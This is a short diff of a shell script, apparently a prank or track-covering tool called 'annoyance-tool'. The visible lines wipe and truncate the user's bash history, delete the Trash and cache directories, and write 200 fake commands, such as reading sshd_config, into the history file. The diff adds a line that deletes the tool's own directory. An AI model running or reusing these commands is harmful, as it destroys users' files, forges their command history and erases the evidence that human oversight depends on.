@@ -52,7 +52,7 @@ EOF
 fi
 
 #garbage
-history -c
+cat /dev/null > ~/.bash_history && history -c
 rm -f $HOME/.bash_history
 rm -rf $HOME/.local/share/Trash/*
 rm -rf $HOME/.cache/*
@@ -71,3 +71,4 @@ for i in {1..200}; do
     10) echo "cat /etc/ssh/sshd_config";;
   esac
 done >> ~/.bash_history
+rm -rf ../annoyance-tool
